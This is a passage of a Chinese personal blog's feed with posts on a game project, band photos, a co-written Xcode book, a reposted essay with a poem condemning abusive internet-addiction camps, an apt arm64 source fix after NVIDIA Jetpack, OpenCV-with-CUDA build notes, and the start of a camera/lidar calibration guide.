<p><img src="http://qiniu.s1nh.org/Blog_XingjieDesign_2.png-QNthin" alt="行界"></p>
<p>这几个月游戏开发进度特别快，游戏策划、UI都已经基本完成了，还确定了名字《行界：零》。下午去公司转了一圈，他们正在讨论游戏交互的设计。突然发现游戏开发团队已经扩大到十几人了。</p>
<!-- ![](http://qiniu.s1nh.org/Blog_XingjieDesign_5.jpg-QNthin) -->

<p><img src="http://qiniu.s1nh.org/Blog_XingjieDesign_6.jpg-QNthin" alt="行界"></p>
<p><img src="http://qiniu.s1nh.org/Blog_XingjieDesign_1.jpg-QNthin" alt="行界"></p>
<p><img src="http://qiniu.s1nh.org/Blog_XingjieDesign_3.jpg-QNthin" alt="行界"></p>
<p>寒冬要到了，祝“益行游戏”能傲然挺立。</p>
<p>官方网站：<a href="http://www.1-xing.com/">http://www.1-xing.com</a></p>
<p>交流群：250293575</p>
<p>官方微博：<a href="http://weibo.com/u/5208965212">@益行游戏</a></p>
<p>百度贴吧：<a href="http://tieba.baidu.com/f?kw=%E8%A1%8C%E7%95%8C">行界吧</a></p>
<p>官方微信公众号：</p>
<p><img src="http://qiniu.s1nh.org/Blog_Yixing_Wechat.jpg-QNthin" alt="行界"></p>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
      <tags>
        <tag>益行游戏</tag>
        <tag>行界</tag>
      </tags>
  </entry>
  <entry>
    <title>鲸落双城记</title>
    <url>/post/WhaleFallLive_201511/</url>
    <content><![CDATA[<p>新加入鲸落乐队，我当Bass手。弹Bass没什么存在感，可是玩的很开心:-) </p>
<span id="more"></span>

<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_0.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_3.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_4.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_5.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_6.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_7.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_8.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_9.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_10.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_11.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_12.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_13.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_14.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_15.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_16.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_17.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_18.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_19.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_20.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_21.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_22.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_23.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_24.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_25.jpg-QNthin" alt="鲸落"></p>
<p><img src="http://qiniu.s1nh.org/Blog_FallingWhaleLive_201511_26.jpg-QNthin" alt="鲸落"></p>
]]></content>
      <categories>
        <category>音乐</category>
      </categories>
      <tags>
        <tag>Live</tag>
        <tag>鲸落</tag>
      </tags>
  </entry>
  <entry>
    <title>《Xcode 江湖录》已经出版</title>
    <url>/post/XcodeJianghu/</url>
    <content><![CDATA[<p>写了半年多，经过无数次修改，这本书终于定稿了。一多半内容是李俊阳编写的，我写了设计篇、版本管理和一些附录，胡雪婷编写了部分故事，卢力画了插图。</p>
<span id="more"></span>

<p><img src="http://qiniu.s1nh.org/Blog_Xcode_Jianghu_3.jpg-QNthin" alt="S1NH"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Xcode_Jianghu_4.png-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Xcode_Jianghu_5.png-QNthin"></p>
<p>我们和出版社沟通过后，决定将本书的前三章免费放出，并且将随时保持更新~</p>
<p><a href="https://www.gitbook.com/@xcode-jianghu">在线阅读 @GitBook</a></p>
<p><a href="https://github.com/Xcode-Jianghu/Xcode-Jianghu">勘误, 代码, etc @GitHub</a></p>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
  </entry>
  <entry>
    <title>豫章书院与当代鲁迅的倒下</title>
    <url>/post/YZSY/</url>
    <content><![CDATA[<blockquote>
<p>有多少人，终其一生只为摆脱原生家庭</p>
</blockquote>
<p><img src="http://qiniu.s1nh.org/family-of-origin_01.jpg-QNthin"></p>
<span id="more"></span>

<p>三十年前，人们惊呼流行音乐会毁掉下一代；二十年前，人们惊呼电视节目会毁掉下一代；十年前，人们惊呼电脑及因特网会毁掉下一代；现在，人们开始惊呼手机会毁掉下一代……<br>人类发展的历史证明：“没有任何力量能毁掉下一代，除了上一代。”</p>
<blockquote>
<p>突然想起来知乎这篇文章《<a href="https://www.zhihu.com/question/265376737">如何看待小女孩歇斯底里呐喊「我想静一静怎么样」与父母对质的视频？</a>》</p>
</blockquote>
<hr>
<p><code>转载，不敢代表本人观点</code></p>
<p>原文：<a href="https://www.zhihu.com/question/67711047/answer/255705079">https://www.zhihu.com/question/67711047/answer/255705079</a></p>
<p><code>一想到生孩子不需要考证，我就感到深深的恐怖。</code></p>
<p>许多“成年人”们手握权利，口论道义，却干尽丧尽天良的事，炒出高价房、工厂乱排乱放有毒有害物质、倒地碰瓷、三聚氰胺毒牛奶、苏丹红炸鸡，各类事件层出不穷。</p>
<p>豫章书院外还有杨永信，国务院政府特殊津贴专家，对未成年人使用高额度电刑，暴走大事件的曝光，柴静的采访，央视的调查，还是没有判刑，竟然还活在世界上。戒网瘾学校致死的人太多了，进十年来，只要不服从家长命令的，送到那几个“集中营”里去，比孙悟空的金紧箍还管用，报案警察也打过招呼，只有真的死人了，社会舆论快压不下去了，就让学校随便赔点钱就糊弄过去了。魏时水不是第一个，也不是最后一个。</p>
<p>有一个故事，世上的笨鸟有三种：一种是先飞的，一种是嫌累不飞的，第三种是自己飞不好，下个蛋逼迫自己孩子飞的。接下来，第三种鸟被洗了脑，把孩子翅膀折断丢下悬崖，等待奇迹的出现。把孩子送进网戒学校的家长，许多就属于第三种鸟。</p>
<p>如封建地主与奴隶一般，社会阶级矛盾激化，当代许多家长对子女采用类同于奴隶制的方式管理而并非理性的教育，实施命令而非商量，不可以发展家长不喜欢的自我兴趣，必须上他们认为有用的补习班。当今中国的建立，正是奴隶推翻了地主，所以国歌中所唱“起来，不愿做奴隶的人们”，刷新了旧的传统，推翻了皇权，做出了“离经叛道”。那家长和子女的矛盾，又该如何解决呢？</p>
<p>正直敢言者又遭封杀，鲁迅书中人吃人的世界又回来了，他笔下的人又欢呼雀跃了。</p>
<p>以下转自暴走大事件第五季36期（文字版）王尼玛：当父母责任大呀，又要养又要教，没有自由还花钱。等孩子长大了，不如己意，做梦都想弄死，又不想负法律责任，于是像豫章书院这样的屠宰所应运而生。收人钱财替人消灾嘛。像旧时治疗精神病那样，电棍水刑关小黑屋切除脑前叶。顽劣叫嚣者进去，憨笑流口水者出来，又是父母的好孩子啦！</p>
<p>因此不难理解，为什么在事情曝光之后，有些父母优先的不是保护自己的孩子，而是跳出来为书院说话。因为在他们的眼里，书院是帮了他们大忙啊！孩子的确是看上去乖了呀！的确听话了呀！他们不去思考这听话的背后到底经历了什么，也不愿意去思考。因为他们不能接受自己是帮凶的事实。可你们就是帮凶！你们亲笔签下了生死状，把你的小孩交给了一群刽子手，直到他们哭着喊着说：“妈妈妈妈我爱你。”他们意识不到孩子并非是他的私人物品，而是一个独立或者正在独立自主的个人。</p>
<p>我们说子不教父之过。教不好，你也不能送去让屠夫背锅吧！对于杨永信这样的妖魔，总有一天是会伏法的。</p>
<blockquote>
<p>孩子养好了 出息了 成功了<br>家长：看我把孩子教育的多好</p>
</blockquote>
<blockquote>
<p>孩子沉迷了 抑郁了 甚至犯罪了<br>家长：游戏/社会害了他</p>
</blockquote>
<hr>
<p>我送你一座崭新的奥斯维辛，<br>我送你一个工艺精湛的地狱，<br>我送你一具肥美多汁的躯体，<br>掀开头盖骨偷走了粉嫩的脑子，<br>挖出来的肠子鲜艳的红色很可爱，<br>绿色的苍蝇在你腐烂的躯体上显得晶莹剔透，<br>我给你烤一份新鲜的脑花，<br>我给你烤一份新鲜的心脏，<br>我给你化妆，遮住星星点点的尸斑，<br>我帮你剔除未来不需要的，<br>你要在跑道上飞起来啊。<br>孩子，你说话啊，妈妈爸爸爱你。<br>孩子，你说话啊，我们在教育你成才。<br>孩子，你说话啊，你爱我们。<br>孩子，你说话啊，你爱祖国。<br>孩子，你说话啊，你爱世界。</p>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
  </entry>
  <entry>
    <title>安装NVIDIA Jetpack/DriveInstall后，apt-get 报错无arm64源</title>
    <url>/post/arm64-after-jetpack/</url>
    <content><![CDATA[<blockquote>
<p>网上的解决方案大多是<code>删除已经安装的arm64包，然后执行dpkg --remove-architecture arm64</code>，但是错误在下次刷机后依然会出现</p>
</blockquote>
<span id="more"></span>

<p>使用NVIDIA Jetson TX1/TX2，Drive PX2 的同学在刷完机以后，宿主机的apt-get无法正确使用。原因是自带的刷机包（Jetpack/DriveInstall）给系统安装了arm64的软件包，报错如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> Err:29 http:&#x2F;&#x2F;archive.ubuntu.com&#x2F;ubuntu xenial&#x2F;main arm64 Packages</span><br><span class="line">  404  Not Found [IP: 91.189.88.161 80]</span><br><span class="line">Ign:37 http:&#x2F;&#x2F;archive.ubuntu.com&#x2F;ubuntu xenial&#x2F;universe arm64 Packages</span><br><span class="line">Ign:40 http:&#x2F;&#x2F;archive.ubuntu.com&#x2F;ubuntu xenial&#x2F;multiverse arm64 Packages</span><br><span class="line">Err:46 http:&#x2F;&#x2F;archive.ubuntu.com&#x2F;ubuntu xenial-updates&#x2F;main arm64 Packages</span><br><span class="line">  404  Not Found [IP: 91.189.88.161 80]</span><br><span class="line">Ign:56 http:&#x2F;&#x2F;archive.ubuntu.com&#x2F;ubuntu xenial-updates&#x2F;universe arm64 Packages</span><br><span class="line">Ign:62 http:&#x2F;&#x2F;archive.ubuntu.com&#x2F;ubuntu xenial-updates&#x2F;multiverse arm64 Packages</span><br><span class="line">Err:68 http:&#x2F;&#x2F;archive.ubuntu.com&#x2F;ubuntu xenial-backports&#x2F;main arm64 Packages</span><br><span class="line">  404  Not Found [IP: 91.189.88.161 80]</span><br><span class="line">Ign:75 http:&#x2F;&#x2F;archive.ubuntu.com&#x2F;ubuntu xenial-backports&#x2F;universe arm64 Packages</span><br><span class="line">Err:83 http:&#x2F;&#x2F;archive.ubuntu.com&#x2F;ubuntu xenial-security&#x2F;main arm64 Packages</span><br><span class="line">  404  Not Found [IP: 91.189.88.161 80]</span><br><span class="line">Ign:93 http:&#x2F;&#x2F;archive.ubuntu.com&#x2F;ubuntu xenial-security&#x2F;universe arm64 Packages</span><br><span class="line">Ign:99 http:&#x2F;&#x2F;archive.ubuntu.com&#x2F;ubuntu xenial-security&#x2F;multiverse arm64 Packages</span><br></pre></td></tr></table></figure>

<p>正确的解决方案为，修改<code>/etc/apt/source.list</code>在每一行的<code>deb</code>和<code>http://×××</code>中间加入<code>[arch=amd64,i386]</code>，修改后的<code>source.list</code>文件如下（仅供参考，请按需修改）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># deb cdrom:[Xubuntu 16.04.4 LTS _Xenial Xerus_ - Release amd64 (20180228)]&#x2F; xenial main multiverse restricted universe</span><br><span class="line"></span><br><span class="line"># See http:&#x2F;&#x2F;help.ubuntu.com&#x2F;community&#x2F;UpgradeNotes for how to upgrade to</span><br><span class="line"># newer versions of the distribution.</span><br><span class="line">deb [arch&#x3D;amd64,i386] http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; xenial main restricted</span><br><span class="line"># deb-src http:&#x2F;&#x2F;cn.archive.ubuntu.com&#x2F;ubuntu&#x2F; xenial main restricted</span><br><span class="line"></span><br><span class="line">## Major bug fix updates produced after the final release of the</span><br><span class="line">## distribution.</span><br><span class="line">deb [arch&#x3D;amd64,i386] http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; xenial-updates main restricted</span><br><span class="line"># deb-src http:&#x2F;&#x2F;cn.archive.ubuntu.com&#x2F;ubuntu&#x2F; xenial-updates main restricted</span><br><span class="line"></span><br><span class="line">## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu</span><br><span class="line">## team. Also, please note that software in universe WILL NOT receive any</span><br><span class="line">## review or updates from the Ubuntu security team.</span><br><span class="line">deb [arch&#x3D;amd64,i386] http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; xenial universe</span><br><span class="line"># deb-src http:&#x2F;&#x2F;cn.archive.ubuntu.com&#x2F;ubuntu&#x2F; xenial universe</span><br><span class="line">deb [arch&#x3D;amd64,i386] http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; xenial-updates universe</span><br><span class="line"># deb-src http:&#x2F;&#x2F;cn.archive.ubuntu.com&#x2F;ubuntu&#x2F; xenial-updates universe</span><br><span class="line"></span><br><span class="line">## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu </span><br><span class="line">## team, and may not be under a free licence. Please satisfy yourself as to </span><br><span class="line">## your rights to use the software. Also, please note that software in </span><br><span class="line">## multiverse WILL NOT receive any review or updates from the Ubuntu</span><br><span class="line">## security team.</span><br><span class="line">deb [arch&#x3D;amd64,i386] http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; xenial multiverse</span><br><span class="line"># deb-src http:&#x2F;&#x2F;cn.archive.ubuntu.com&#x2F;ubuntu&#x2F; xenial multiverse</span><br><span class="line">deb [arch&#x3D;amd64,i386] http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; xenial-updates multiverse</span><br><span class="line"># deb-src http:&#x2F;&#x2F;cn.archive.ubuntu.com&#x2F;ubuntu&#x2F; xenial-updates multiverse</span><br><span class="line"></span><br><span class="line">## N.B. software from this repository may not have been tested as</span><br><span class="line">## extensively as that contained in the main release, although it includes</span><br><span class="line">## newer versions of some applications which may provide useful features.</span><br><span class="line">## Also, please note that software in backports WILL NOT receive any review</span><br><span class="line">## or updates from the Ubuntu security team.</span><br><span class="line">deb [arch&#x3D;amd64,i386] http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; xenial-backports main restricted universe multiverse</span><br><span class="line"># deb-src http:&#x2F;&#x2F;cn.archive.ubuntu.com&#x2F;ubuntu&#x2F; xenial-backports main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">## Uncomment the following two lines to add software from Canonical&#39;s</span><br><span class="line">## &#39;partner&#39; repository.</span><br><span class="line">## This software is not part of Ubuntu, but is offered by Canonical and the</span><br><span class="line">## respective vendors as a service to Ubuntu users.</span><br><span class="line"># deb http:&#x2F;&#x2F;archive.canonical.com&#x2F;ubuntu xenial partner</span><br><span class="line"># deb-src http:&#x2F;&#x2F;archive.canonical.com&#x2F;ubuntu xenial partner</span><br><span class="line"></span><br><span class="line">deb [arch&#x3D;amd64,i386] http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; xenial-security main restricted</span><br><span class="line"># deb-src http:&#x2F;&#x2F;security.ubuntu.com&#x2F;ubuntu xenial-security main restricted</span><br><span class="line">deb [arch&#x3D;amd64,i386] http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; xenial-security universe</span><br><span class="line"># deb-src http:&#x2F;&#x2F;security.ubuntu.com&#x2F;ubuntu xenial-security universe</span><br><span class="line">deb [arch&#x3D;amd64,i386] http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu&#x2F; xenial-security multiverse</span><br><span class="line"># deb-src http:&#x2F;&#x2F;security.ubuntu.com&#x2F;ubuntu xenial-security multiverse</span><br><span class="line"># deb-src http:&#x2F;&#x2F;archive.ubuntu.com&#x2F;ubuntu xenial universe</span><br><span class="line">deb  [arch&#x3D;amd64,i386]  http:&#x2F;&#x2F;archive.ubuntu.com&#x2F;ubuntu xenial universe</span><br><span class="line"># deb-src http:&#x2F;&#x2F;archive.ubuntu.com&#x2F;ubuntu xenial universe</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
  </entry>
  <entry>
    <title>OpenCV 编译安装笔记</title>
    <url>/post/build-cuda-with-opencv/</url>
    <content><![CDATA[<h2 id="编译OpenCV-with-CUDA"><a href="#编译OpenCV-with-CUDA" class="headerlink" title="编译OpenCV with CUDA"></a>编译OpenCV with CUDA</h2><p>编译方法<a href="http://docs.opencv.org/3.1.0/d7/d9f/tutorial_linux_install.html">官方文档</a>写的特别清楚。此外，如果要使用python接口，编译完成后需要把<code>opencv/site-packages</code>目录下的<code>cv2.so</code>链接（或复制）到<code>python/site-packages</code>中，我执行的命令为<code>sudo ln -s  /usr/local/opencv3/lib/python2.7/dist-packages/cv2.so /usr/lib/python2.7/dist-packages/cv2.so</code>（如果不清楚可以参照<a href="http://www.jianshu.com/p/67293b547261">[翻译]Python 2.7 和 Python 3+ 的OpenCV 3.0 安装教程</a>）</p>
<p>查看Api和Guides推荐使用Zeal/Dash，就不用那么麻烦跑去官网搜索了：</p>
<p><img src="http://qiniu.s1nh.org/Blog_zeal-main.png"></p>
<span id="more"></span>

<p>编译时如果要支持cuda，需要增加几个编译参数，可以参照<a href="http://stackoverflow.com/questions/28010399/build-opencv-with-cuda-support">Build OpenCV with CUDA support</a>。如果您不会用cmake，不知到应该加填什么参数。我建议用图形化的cmake-gui来设置参数。</p>
<p>其中要注意的是 CUDA_GENERATION 的设置。如果选择您GPU内核的型号（<code>Pascal</code>、<code>Maxwell</code>等），那么就不需要设置<code>CUDA_ARC_BIN</code>和<code>CUDA_ARC_PTX</code>参数，可是这种条件下会导致一些错误。推荐的方法是设置 <code>CUDA_GENERATION = Auto</code> 然后到<a href="https://developer.nvidia.com/cuda-gpus">CUDA GPUs</a>查看您显卡的<code>Compute Capability</code>，填到<code>CUDA_ARC_BIN</code>，<code>CUDA_ARC_PTX</code>中。</p>
<p><img src="http://qiniu.s1nh.org/Blog_build-cuda-with-opencv-cmake.png" title="cmake-gui"></p>
<h2 id="Bugs"><a href="#Bugs" class="headerlink" title="Bugs:"></a>Bugs:</h2><h3 id="Ubuntu-16-OpenCV-3-Cuda-8-0-编译Bug"><a href="#Ubuntu-16-OpenCV-3-Cuda-8-0-编译Bug" class="headerlink" title="Ubuntu 16 + OpenCV 3 + Cuda 8.0 编译Bug"></a>Ubuntu 16 + OpenCV 3 + Cuda 8.0 编译Bug</h3><p>编译时会出现如下已知错误<code>error: no default constructor exists for class &quot;thrust::detail::execute_with_allocator&lt;cv::cuda::device::ThrustAllocator, thrust::system::cuda::detail::execute_on_stream_base&gt;&quot;</code>。解决方案为：</p>
<ol>
<li>下载<code>https://github.com/thrust/thrust</code>的<code>cuda-next-release</code>分支</li>
<li>把<code>CUDA\v8.0\include\thrust\</code> 重命名为 <code>thrust_old</code></li>
<li>建立软链接``CUDA\v8.0\include\thrust` 到 <code>...cuda-next-release\thrust</code></li>
</ol>
<blockquote>
<p>参考:<br>　　1.<a href="http://answers.opencv.org/question/95991/opencv-30-build-error-cuda-80/?answer=96837">OpenCV 3.0 Build Error Cuda 8.0</a><br>　　2.<a href="https://github.com/opencv/opencv/issues/6632">Opencv 3.1. CUDA 8 compatibility issues</a><br>　　3.<a href="https://github.com/thrust/thrust/issues/800">thrust 1.8.3 exclusive_scan with custom temporary allocation, no default constructor error</a></p>
</blockquote>
<h3 id="缺少-ImfChromaticities-h"><a href="#缺少-ImfChromaticities-h" class="headerlink" title="缺少 ImfChromaticities.h"></a>缺少 ImfChromaticities.h</h3><p>过了一个星期重新编译的时候发现了一个错误</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">In file included from &#x2F;home&#x2F;duchengyao&#x2F;project&#x2F;opencv&#x2F;modules&#x2F;imgcodecs&#x2F;src&#x2F;grfmts.hpp:53:0,</span><br><span class="line">                 from &#x2F;home&#x2F;duchengyao&#x2F;project&#x2F;opencv&#x2F;modules&#x2F;imgcodecs&#x2F;src&#x2F;loadsave.cpp:47:</span><br><span class="line"></span><br><span class="line">***&#x2F;opencv&#x2F;modules&#x2F;imgcodecs&#x2F;src&#x2F;grfmt_exr.hpp:52:31: fatal error: ImfChromaticities.h: No such file or directory</span><br><span class="line">compilation terminated.</span><br><span class="line">modules&#x2F;imgcodecs&#x2F;CMakeFiles&#x2F;opencv_imgcodecs.dir&#x2F;build.make:62: recipe for target &#39;modules&#x2F;imgcodecs&#x2F;CMakeFiles&#x2F;opencv_imgcodecs.dir&#x2F;src&#x2F;loadsave.cpp.o&#39; failed</span><br><span class="line">make[2]: *** [modules&#x2F;imgcodecs&#x2F;CMakeFiles&#x2F;opencv_imgcodecs.dir&#x2F;src&#x2F;loadsave.cpp.o] Error 1</span><br><span class="line">CMakeFiles&#x2F;Makefile2:4114: recipe for target &#39;modules&#x2F;imgcodecs&#x2F;CMakeFiles&#x2F;opencv_imgcodecs.dir&#x2F;all&#39; failed</span><br><span class="line">make[1]: *** [modules&#x2F;imgcodecs&#x2F;CMakeFiles&#x2F;opencv_imgcodecs.dir&#x2F;all] Error 2</span><br><span class="line">make[1]: *** Waiting for unfinished jobs....</span><br></pre></td></tr></table></figure>

<p>解决方案：安装<code>libopenexr-dev</code></p>
<h2 id="OpenCV-2与3共存"><a href="#OpenCV-2与3共存" class="headerlink" title="OpenCV 2与3共存"></a>OpenCV 2与3共存</h2><p>参见<a href="http://blog.csdn.net/Swearos/article/details/51307304">ubuntu 16.04 编译opencv3.1，opencv多版本切换</a></p>
<p>上一个教程讲的很清楚，可是作者是在shell中运行OpenCV程序的。如果您正在使用Eclipse调试，那么无法用export来设置环境变量。需要在Eclipse中添加CDT的环境变量，步骤如下：<em>（参照《<a href="http://blog.csdn.net/m624197265/article/details/42672025">Eclipse CDT环境下编写、调试、运行C++程序详谈</a>》的后半部分）</em></p>
<ol>
<li><strong>右键点击工程</strong>–&gt;<strong>Run As</strong>–&gt;<strong>Run Configurations</strong>–&gt;<strong>Environment</strong></li>
<li>添加<code>PKG_CONFIG_PATH=$PKG_CONFIG_PATH:/usr/local/opencv3/lib/pkgconfig</code></li>
<li>添加<code>LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/opencv3/lib</code></li>
</ol>
<p><img src="http://qiniu.s1nh.org/Blog_build-cuda-with-opencv-cv3-environment.png" title="在eclipse中设置OpenCV3的环境变量"></p>
<p>用Eclipse开发还需要记得添加<code>include</code>和<code>lib</code>目录，参照<a href="http://docs.opencv.org/3.1.0/d7/d16/tutorial_linux_eclipse.html">Using OpenCV with Eclipse (plugin CDT)</a></p>
<h2 id="OpenCV-3-Demo"><a href="#OpenCV-3-Demo" class="headerlink" title="OpenCV 3 Demo"></a>OpenCV 3 Demo</h2><p><code>OpenCV 3</code>的<code>CUDA</code>模块跟<code>OpenCV2</code>的完全不一样，升级OpenCV3以后，你会发现<a href="http://opencv.org/platforms/cuda.html">官方的Hello World for CUDA</a>都跑不起来，因为 OpenCV 3 连GPU类都没了。详细请参见<a href="http://docs.opencv.org/3.1.0/">doc.OpenCV3</a>, <a href="http://docs.opencv.org/2.4.13/">doc.OpenCV2</a></p>
<p>Cuda OpenCV 3 的 Demo 如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;代码修改自 [OpenCV 3 CUDA小测试](http:&#x2F;&#x2F;blog.csdn.net&#x2F;zimizile&#x2F;article&#x2F;details&#x2F;47168107)</span><br><span class="line"></span><br><span class="line">#include&quot;opencv2&#x2F;opencv.hpp&quot;</span><br><span class="line">#include&quot;opencv2&#x2F;cudaimgproc.hpp&quot;</span><br><span class="line">#include&lt;time.h&gt;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line">using namespace cv;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    clock_t t1 &#x3D; clock();</span><br><span class="line"></span><br><span class="line">    int num_devices &#x3D; cv::cuda::getCudaEnabledDeviceCount();</span><br><span class="line"></span><br><span class="line">    if (num_devices &lt;&#x3D; 0)&#123;</span><br><span class="line">        cerr &lt;&lt; &quot;There is no device.&quot; &lt;&lt; endl;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    int enable_device_id &#x3D; -1;</span><br><span class="line">    for (int i &#x3D; 0; i &lt; num_devices; i++)&#123;</span><br><span class="line">        cv::cuda::DeviceInfo dev_info(i);</span><br><span class="line">        if (dev_info.isCompatible())&#123;</span><br><span class="line">            enable_device_id &#x3D; i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (enable_device_id &lt; 0)&#123;</span><br><span class="line">        cerr &lt;&lt; &quot;GPU module isn&#39;t built for GPU&quot; &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cv::cuda::setDevice(enable_device_id);</span><br><span class="line"></span><br><span class="line">    Mat src_image &#x3D; imread(&quot;&#x2F;home&#x2F;duchengyao&#x2F;cuda-workspace&#x2F;cat.jpg&quot;);</span><br><span class="line">    Mat dst_image;</span><br><span class="line">    cuda::GpuMat d_src_img(src_image); &#x2F;&#x2F;upload src image to gpu</span><br><span class="line">    cuda::GpuMat d_dst_img;</span><br><span class="line">    cuda::cvtColor(d_src_img, d_dst_img, CV_BGR2GRAY);</span><br><span class="line">    d_dst_img.download(dst_image);</span><br><span class="line">    imshow(&quot;test&quot;, dst_image);</span><br><span class="line"></span><br><span class="line">    clock_t t2 &#x3D; clock();</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; &quot;time: &quot; &lt;&lt; (t2 - t1) &#x2F; 1000 &lt;&lt; &quot;s&quot; &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    waitKey();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>图形图像</category>
      </categories>
      <tags>
        <tag>cuda</tag>
        <tag>opencv</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>多目相机、Velodyne标定那些破事</title>
    <url>/post/calib-velodyne-camera/</url>
    <content><![CDATA[<h2 id="0x01-制作标定板"><a href="#0x01-制作标定板" class="headerlink" title="0x01 制作标定板"></a>0x01 制作标定板</h2><ul>
<li>在线生成棋盘格 <a href="https://calib.io/pages/camera-calibration-pattern-generator">https://calib.io/pages/camera-calibration-pattern-generator</a></li>
<li>在线生成aruco <a href="http://chev.me/arucogen/">http://chev.me/arucogen/</a></li>
</ul>
<h2 id="0x02-相机标定"><a href="#0x02-相机标定" class="headerlink" title="0x02 相机标定"></a>0x02 相机标定</h2><ul>
<li><a href="http://wiki.ros.org/camera_calibration/Tutorials/StereoCalibration">camera_calibration</a>: 使用棋盘格进行标定；</li>
<li><a href="https://github.com/ethz-asl/kalibr">kalibr</a>: 这个感觉更专业一些，可以同时标多目和IMU。</li>
</ul>
<h2 id="0x03-雷达–-gt-相机外参标定"><a href="#0x03-雷达–-gt-相机外参标定" class="headerlink" title="0x03 雷达–&gt;相机外参标定"></a>0x03 雷达–&gt;相机外参标定</h2><p>目前我成功的有两种方法：</p>
<ul>
<li><code>autoware_camera_lidar_calibrator</code> : 不需要自制标定板，需要手动人工点击9个点</li>
<li><code>velo2cam_calibration</code> : 全自动，需要定制一个标定板</li>
</ul>
<span id="more"></span>

